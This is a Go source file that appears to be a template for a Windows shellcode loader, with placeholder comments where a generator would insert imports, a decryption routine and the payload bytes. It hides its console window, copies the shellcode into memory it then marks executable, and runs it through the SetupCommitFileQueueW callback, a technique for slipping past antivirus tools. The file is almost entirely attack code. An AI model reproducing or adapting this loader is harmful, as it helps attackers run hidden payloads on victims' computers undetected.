package main

import (
	"github.com/gonutz/ide/w32"
	"golang.org/x/sys/windows"
	"unsafe"
	//__import__
)


func closeWindows(commandShow uintptr) {
	console := w32.GetConsoleWindow()
	if console != 0 {
		_, consoleProcID := w32.GetWindowThreadProcessId(console)
		if w32.GetCurrentProcessId() == consoleProcID {
			w32.ShowWindowAsync(console, commandShow)
		}
	}
}

// 解密函数
func f() {}

func main() {
	// shellcode
	closeWindows(w32.SW_HIDE)
	//__init__

	kernel32          := windows.NewLazyDLL("kernel32.dll")
	ntdll             := windows.NewLazyDLL("ntdll.dll")
	Setupapi              := windows.NewLazyDLL("Setupapi.dll")
	User32                := windows.NewLazyDLL("User32.dll")
	VirtualAlloc      := kernel32.NewProc("VirtualAlloc")
	SetupOpenFileQueue    := Setupapi.NewProc("SetupOpenFileQueue")
	SetupQueueCopyW       := Setupapi.NewProc("SetupQueueCopyW")
	SetupCommitFileQueueW := Setupapi.NewProc("SetupCommitFileQueueW")
	GetTopWindow          := User32.NewProc("GetTopWindow")
	RtlMoveMemory     := ntdll.NewProc("RtlMoveMemory")
	VirtualProtect        := kernel32.NewProc("VirtualProtect")


	addr, _, _ := VirtualAlloc.Call(0, uintptr(len(byteSlice)), 0x1000|0x2000, 0x04)
	RtlMoveMemory.Call(addr, (uintptr)(unsafe.Pointer(&byteSlice[0])), uintptr(len(byteSlice)))
	oldProtect := 0x04
	VirtualProtect.Call(addr, uintptr(len(byteSlice)), 0x20, uintptr(unsafe.Pointer(&oldProtect)))
	hQueue, _, _ := SetupOpenFileQueue.Call()
	p1, _ := windows.UTF16PtrFromString("c:\\")
	p2, _ := windows.UTF16PtrFromString("\\windows\\sytem32\\")
	p3, _ := windows.UTF16PtrFromString("kernel32.dll")
	p4, _ := windows.UTF16PtrFromString("c:\\windows\\temp\\")
	SetupQueueCopyW.Call(hQueue,
		uintptr(unsafe.Pointer(p1)),
		uintptr(unsafe.Pointer(p2)),
		uintptr(unsafe.Pointer(p3)),
		0,
		0,
		uintptr(unsafe.Pointer(p4)),
		uintptr(unsafe.Pointer(p3)),
		0x0000400,
	)
	Gtw, _, _ := GetTopWindow.Call()
	SetupCommitFileQueueW.Call(Gtw, hQueue, addr, 0)
}